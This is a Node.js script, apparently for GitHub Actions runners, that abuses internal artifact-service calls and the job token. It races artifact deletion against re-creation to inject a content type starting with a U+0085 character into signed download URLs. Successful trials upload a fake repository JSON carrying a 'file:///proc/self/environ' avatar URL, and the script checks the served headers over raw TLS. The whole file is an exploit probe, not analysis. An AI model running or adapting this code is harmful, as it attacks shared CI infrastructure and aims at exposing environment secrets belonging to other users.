import {createHash} from 'node:crypto';
import https from 'node:https';
import tls from 'node:tls';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"delete-recreate"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;

async function create(name, version) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version,
      mimeType: StringValue.create({value: version === 7 ? 'application/json' : odd}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function upload(url, bytes = placeholder) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function del(name) {
  try {
    const value = await client.DeleteArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: Boolean(value.ok)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const raw = value.signedUrl || value.signed_url;
    const u = new URL(raw);
    return {ok: true, rsct: u.searchParams.get('rsct'), rawRsct: (raw.match(/[?&]rsct=([^&]*)/) || [])[1], url: raw};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 160)};
  }
}

function rawTls(urlStr) {
  const u = new URL(urlStr);
  return new Promise((resolve, reject) => {
    const socket = tls.connect({host: u.hostname, port: Number(u.port || 443), servername: u.hostname, ALPNProtocols: ['http/1.1']});
    socket.setTimeout(20000);
    const chunks = [];
    socket.once('secureConnect', () => {
      socket.write(`GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${u.host}\r\nUser-Agent: krace\r\nConnection: close\r\n\r\n`);
    });
    socket.on('data', (c) => chunks.push(c));
    socket.once('error', reject);
    socket.once('timeout', () => socket.destroy(new Error('timeout')));
    socket.once('end', () => {
      const raw = Buffer.concat(chunks);
      const i = raw.indexOf('\r\n\r\n');
      const head = i < 0 ? raw.toString('latin1') : raw.subarray(0, i).toString('latin1');
      const status = Number((head.split('\r\n')[0] || '').split(' ')[1]);
      const cts = [];
      for (const line of head.split('\r\n').slice(1)) {
        const p = line.indexOf(':');
        if (p < 0) continue;
        if (line.slice(0, p).toLowerCase() === 'content-type') cts.push(Buffer.from(line.slice(p + 1).trim(), 'latin1').toString('hex'));
      }
      resolve({status, cts});
    });
  });
}

async function restLocation(id) {
  return new Promise((resolve, reject) => {
    const r = https.request(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`, {
      headers: {authorization: `Bearer ${token}`, accept: 'application/vnd.github.v3+json', 'user-agent': 'krace'},
    }, (res) => {
      res.resume();
      res.on('end', () => resolve({status: res.statusCode, location: res.headers.location || ''}));
    });
    r.on('error', reject);
    r.end();
  });
}

async function deepInspect(name, id) {
  const view = await inspect(name);
  const out = {name, id, view: {ok: view.ok, rsct: view.rsct, rawRsct: view.rawRsct}};
  if (id) {
    const rest = await restLocation(id);
    out.rest = {status: rest.status, rawRsct: (rest.location.match(/[?&]rsct=([^&]*)/) || [])[1], locLen: rest.location.length};
    if (rest.location) {
      try {
        const t = await rawTls(rest.location);
        out.served = {status: t.status, ctHex: t.cts};
      } catch (e) { out.servedErr = String(e).slice(0, 120); }
    }
  }
  return out;
}

async function putCarrier(urls, id) {
  const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
  const bytes = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette delete/recreate carrier',
    stargazers_count: 0,
  }));
  await Promise.all(urls.filter(Boolean).map((url) => upload(url, bytes).catch(() => false)));
  return repository;
}

const wins = [];
async function pendingTrial(index, firstVersion) {
  const name = `pending-${process.env.GITHUB_RUN_ID}-${firstVersion}-${index}`;
  const first = await create(name, firstVersion);
  await upload(first.url);
  const deleted = await del(name);
  const second = await create(name, firstVersion === 7 ? 6 : 7);
  await upload(second.url);
  const fin = await finalize(name);
  const view = await inspect(name);
  const row = {kind: 'pending', index, firstVersion, firstOk: first.ok, deleted, secondOk: second.ok, fin, view: {ok: view.ok, rsct: view.rsct, rawRsct: view.rawRsct}};
  if (view.rsct?.includes('\u0085') && fin.id) {
    row.repository = await putCarrier([first.url, second.url], fin.id);
    row.deep = await deepInspect(name, fin.id);
    wins.push(row);
    console.log(`WINNER ${JSON.stringify(row)}`);
  }
  return row;
}

async function finalizedTrial(index, firstVersion, delay) {
  const name = `finalized-${process.env.GITHUB_RUN_ID}-${firstVersion}-${delay + 30}-${index}`;
  const first = await create(name, firstVersion);
  await upload(first.url);
  const oldFinal = await finalize(name);
  let deletePromise;
  let createPromise;
  if (delay < 0) {
    deletePromise = del(name);
    await sleep(-delay);
    createPromise = create(name, firstVersion === 7 ? 6 : 7);
  } else {
    createPromise = create(name, firstVersion === 7 ? 6 : 7);
    await sleep(delay);
    deletePromise = del(name);
  }
  const [deleted, second] = await Promise.all([deletePromise, createPromise]);
  await upload(second.url);
  const fin = await finalize(name);
  const view = await inspect(name);
  const row = {kind: 'finalized', index, firstVersion, delay, firstOk: first.ok, oldFinal, deleted, secondOk: second.ok, fin, view: {ok: view.ok, rsct: view.rsct, rawRsct: view.rawRsct}};
  if (view.rsct?.includes('\u0085') && (fin.id || oldFinal.id)) {
    const id = fin.id || oldFinal.id;
    row.repository = await putCarrier([first.url, second.url], id);
    row.deep = await deepInspect(name, id);
    wins.push(row);
    console.log(`WINNER ${JSON.stringify(row)}`);
  }
  return row;
}

const trials = [];
for (let i = 0; i < 8; i++) {
  trials.push(() => pendingTrial(i, i % 2 ? 7 : 6));
  for (const delay of [-20, 0, 20]) {
    trials.push(() => finalizedTrial(i, i % 2 ? 7 : 6, delay));
  }
}
const rows = [];
for (let i = 0; i < trials.length; i += 8) {
  rows.push(...await Promise.all(trials.slice(i, i + 8).map((fn) => fn())));
}
const summary = {
  total: rows.length,
  odd: rows.filter((x) => x.view?.rsct?.includes('\u0085')).length,
  json: rows.filter((x) => x.view?.rsct === 'application/json').length,
  zip: rows.filter((x) => x.view?.rsct === 'application/zip').length,
  missing: rows.filter((x) => !x.view?.ok).length,
  wins: wins.length,
};
console.log(`KRACE_SUMMARY ${JSON.stringify(summary)}`);
for (const w of wins) console.log(`KRACE_WIN ${JSON.stringify(w)}`);
